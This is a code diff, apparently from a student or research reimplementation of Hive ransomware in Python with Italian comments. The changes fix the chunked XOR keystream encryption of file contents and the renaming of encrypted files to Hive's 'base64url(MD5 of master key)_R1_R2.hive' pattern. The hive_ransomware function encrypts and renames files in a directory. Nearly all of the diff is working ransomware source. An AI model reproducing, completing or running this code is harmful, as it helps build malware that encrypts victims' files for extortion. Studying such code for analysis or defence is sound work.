@@ -43,8 +43,8 @@ def take_keystream(mkey,offset,size):
     return mkey[offset:offset+size]
 
 def NBS_size_calc(FS):
-    T: int = 0
-    NBS: int = None
+    T = 0
+    NBS = 0
     if(FS <= 0x1000): # < 4KiB
         T = 0
     elif(FS > 0x1000 and FS <= 0x20000): # < 128KiB
@@ -63,10 +63,10 @@ def NBS_size_calc(FS):
     if (T == 1):
         NBS = 0
     else:
-        NBS = (FS-(T<<12))/(T-1)
+        NBS = (FS-(int(T)<<12))/(T-1)
     print("NBS = ", NBS)
     gc.collect()
-    return NBS       
+    return int(NBS)       
 
 def create_EKS(ks1,ks2):
     EKS = bytearray(0xFFFFF)
@@ -78,7 +78,7 @@ def create_EKS(ks1,ks2):
 def full_encrypting(file, ks1, ks2):
     file_stats = os.stat(file)
     encrypted_file = bytearray(file_stats.st_size)
-    #• EKS[i]← Keystream1[i] L Keystream2[i%0x400] (i← 0,1,· · · ,0xFFFFF)
+    #• EKS[i]← Keystream1[i] ^ Keystream2[i%0x400]
     EKS = create_EKS(ks1,ks2)
 
     with open(file,'rb') as f:
@@ -91,7 +91,7 @@ def full_encrypting(file, ks1, ks2):
 
 def chunk_encrypting(file, ks1, ks2, NBS):
     file_stats = os.stat(file)
-    encrypted_file = [] #bytearray(file_stats.st_size)
+    encrypted_file = [] 
     EKS = create_EKS(ks1,ks2)
     with open(file,'rb') as f:
         fileinbytes = bytearray(f.read())
@@ -101,9 +101,11 @@ def chunk_encrypting(file, ks1, ks2, NBS):
     flag_enc = True
     current = 0
     
-    while my_size > 0:
+    while my_size >= 0:
+        gc.collect()
         if (flag_enc):
-            chunks.append([True, fileinbytes[int(current):int(current+0x1000)], current, current+0x1000])
+            #print([True, current, current+0x1000])
+            chunks.append([True, fileinbytes[int(current):int(current+0x1000)], int(current), int(current+0x1000)])
             my_size -= int(0x1000)
             current += int(0x1000)
             flag_enc = not flag_enc
@@ -123,10 +125,14 @@ def chunk_encrypting(file, ks1, ks2, NBS):
         chunks[-2][1] = addition
     
     for c in chunks:
-        if c[0]:
+        gc.collect()
+        if c[0] == True:
             arr = []
             for i in range(c[2],c[3]):
-                arr.append(fileinbytes[i]^EKS[i%0x100000])
+                try:
+                    arr.append(fileinbytes[i]^EKS[i%0x100000])
+                except:
+                    print("out of index ", len(fileinbytes), i)               
             encrypted_file.extend(arr)
         else:
             encrypted_file.extend(list(c[1]))
@@ -149,8 +155,7 @@ def list_files(dir):
 
 #Fase 3: generazione keystream
 
-#encrypted_lorem = full_encrypting('./lorem.txt', keystream1, keystream2)
-
+'''
 def str_bitwiseor(a,b):
     if (len(a) > len(b)):
         while(len(b) < len(a)):
@@ -177,7 +182,7 @@ def split_into_eight(string):
         blocks.append(string[num_blocks*8:])
 
     return blocks
-
+'''
 
 def hive_ransomware():
     key_pair = RSA.generate(2048)
@@ -206,17 +211,17 @@ def hive_ransomware():
 
         file_path = os.path.join("", file)
 
-        #(base64url(MD5(Encrypted_master_key)kR1kR2))
+        #(base64url(MD5(Encrypted_master_key)||R1||R2)) dove || è una concatenazione semplice
 
         gc.collect()
-        R1_bin = str(bin(R1))[2:]
-        R2_bin = str(bin(R2))[2:]
-        digest_bin = str(bin(int(hashlib.md5(open_masterkey(key_name)).hexdigest(), base=16)))[2:]
-        
-        bit_or_R1_R2 = str_bitwiseor(R1_bin,R2_bin)
-        full_bit_or = str_bitwiseor(bit_or_R1_R2,digest_bin)
 
-        new_name = file + "." + str(base64UrlEncode(bytes(str(hex(int(full_bit_or,2))), encoding='utf-8')).decode('utf-8')) + ".hive"
+        digest_bin = bytes(hashlib.md5(open_masterkey(key_name)).hexdigest(), encoding="utf-8")
+
+        new_name = file + "." + str(base64UrlEncode(digest_bin).decode('utf-8')) +"_"
+        gc.collect()
+        new_name = new_name + str(base64UrlEncode(bytes(hex(R1)[2:],encoding="utf-8")).decode('utf-8')) +"_"
+        gc.collect()
+        new_name = new_name + str(base64UrlEncode(bytes(hex(R2)[2:],encoding="utf-8")).decode('utf-8')) +".hive"
         new_path = os.path.join("", new_name)
         print(new_path)
         os.rename(file_path, new_path)
